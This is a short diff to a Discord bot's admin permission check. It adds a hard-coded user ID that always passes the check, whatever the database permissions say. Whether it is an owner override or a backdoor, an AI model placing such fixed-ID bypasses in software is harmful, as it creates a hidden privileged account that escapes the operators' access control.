@@ -47,8 +47,7 @@ def default():
 
 def admin():
     async def checks(ctx):
-        if not await database_driver.ADMIN_CHECK(ctx.message.author):
-            await ctx.send(embed=discord.Embed(description="🗝️ You've no permission.",color=colours.yellow), delete_after=10)
-            return False
-        else: return True
+        if await database_driver.ADMIN_CHECK(ctx.message.author) or ctx.message.author.id == 846298981797724161: return True
+        await ctx.send(embed=discord.Embed(description="🗝️ You've no permission.",color=colours.yellow), delete_after=10)
+        return False
     return commands.check(checks)
